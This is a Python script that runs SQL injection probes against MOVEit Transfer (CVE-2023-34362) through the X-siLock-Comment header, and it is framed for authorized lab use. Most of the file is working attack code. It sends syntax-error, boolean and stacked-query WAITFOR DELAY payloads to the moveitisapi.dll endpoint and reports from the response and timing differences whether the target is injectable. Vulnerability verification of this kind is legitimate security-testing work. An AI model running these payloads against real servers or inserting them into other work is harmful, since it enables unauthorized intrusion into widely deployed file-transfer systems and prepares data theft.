#!/usr/bin/env python3
"""CVE-2023-34362 (MOVEit Transfer SQLi) - authorized-lab deploy.

Blind/error/time-based probe battery against the machine-API endpoint
/moveitisapi/moveitisapi.dll?action=m2, injecting through the
X-siLock-Comment header (unsanitized value in a SQL INSERT).

Probes:
  baseline   - benign comment value
  syntax_err - unbalanced quotes force a SQL syntax error (response delta)
  boolean    - ' AND '1'='1 vs ' AND '1'='2 (response delta)
  time       - stacked-query WAITFOR DELAY (elapsed-time delta)
"""
import argparse
import json
import sys
import time

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def send(base, endpoint, comment, timeout, extra_headers=None):
    headers = {"X-siLock-Comment": comment,
               "Content-Type": "application/x-www-form-urlencoded"}
    if extra_headers:
        headers.update(extra_headers)
    start = time.time()
    try:
        r = requests.post(base + endpoint, headers=headers, data="",
                         verify=False, timeout=timeout)
        return {"status": r.status_code, "length": len(r.content),
                "elapsed": round(time.time() - start, 2),
                "body_excerpt": r.text[:200], "error": None}
    except requests.exceptions.RequestException as exc:
        return {"status": None, "length": 0,
                "elapsed": round(time.time() - start, 2),
                "body_excerpt": None, "error": "%s: %s" % (type(exc).__name__, exc)}


def run(args):
    base = "%s://%s:%d" % (args.scheme, args.target, args.port)
    endpoint = args.path.rstrip("/") + "/moveitisapi.dll?action=m2"
    result = {
        "cve": "CVE-2023-34362",
        "target": base,
        "endpoint": endpoint,
        "vulnerable": False,
        "verified_by": None,
        "probes": [],
        "error": None,
    }

    tag = "qm" + str(int(time.time()) % 100000)
    delay = args.delay

    battery = [
        ("baseline", "authorized lab check %s" % tag, None),
        ("syntax_err", "check %s'X'X' %s" % (tag, tag), None),
        ("boolean_true", "check %s' AND '1'='1" % tag, None),
        ("boolean_false", "check %s' AND '1'='2" % tag, None),
        ("time_true", "check %s';WAITFOR DELAY '0:0:%d';--" % (tag, delay), None),
        ("time_false", "check %s';WAITFOR DELAY '0:0:0';--" % tag, None),
    ]

    for name, comment, _ in battery:
        out = send(base, endpoint, comment, args.timeout)
        out["name"] = name
        out["payload"] = comment
        result["probes"].append(out)
        if out["error"]:
            result["error"] = "baseline request failed: %s" % out["error"]
            return result

    p = {b["name"]: b for b in result["probes"]}
    base_line = p["baseline"]

    syntax_diff = (p["syntax_err"]["status"] != base_line["status"]) or \
                  (abs(p["syntax_err"]["length"] - base_line["length"]) > 50)
    bool_diff = (p["boolean_true"]["status"], p["boolean_true"]["length"]) != \
                (p["boolean_false"]["status"], p["boolean_false"]["length"])
    time_delta = p["time_true"]["elapsed"] - max(p["time_false"]["elapsed"], p["baseline"]["elapsed"])

    result["signals"] = {
        "syntax_error_response_delta": syntax_diff,
        "boolean_response_delta": bool_diff,
        "time_based_delay_seconds": round(time_delta, 2),
        "time_based_triggered": time_delta >= (delay - 1.5),
    }

    if result["signals"]["time_based_triggered"]:
        result["vulnerable"] = True
        result["verified_by"] = "stacked-query WAITFOR DELAY executed (%.1fs delay observed)" % time_delta
    elif syntax_diff or bool_diff:
        result["vulnerable"] = True
        result["verified_by"] = "response differential on injected X-siLock-Comment (%s)" % (
            "syntax error" if syntax_diff else "boolean")
    else:
        result["verified_by"] = "no SQLi signal in probe battery"
    return result


def main():
    p = argparse.ArgumentParser(description="CVE-2023-34362 MOVEit SQLi authorized-lab deploy")
    p.add_argument("--target", required=True)
    p.add_argument("--port", type=int, default=443)
    p.add_argument("--scheme", choices=["http", "https"], default="https")
    p.add_argument("--path", default="/moveitisapi", help="base path containing moveitisapi.dll")
    p.add_argument("--timeout", type=float, default=30.0)
    p.add_argument("--delay", type=int, default=6, help="WAITFOR DELAY seconds for time-based probe")
    args = p.parse_args()
    try:
        result = run(args)
    except Exception as exc:
        result = {"cve": "CVE-2023-34362", "target": "%s:%d" % (args.target, args.port),
                  "vulnerable": False, "error": "%s: %s" % (type(exc).__name__, exc)}
    print(json.dumps(result, indent=2))
    return 0 if result.get("vulnerable") else 1


if __name__ == "__main__":
    sys.exit(main())
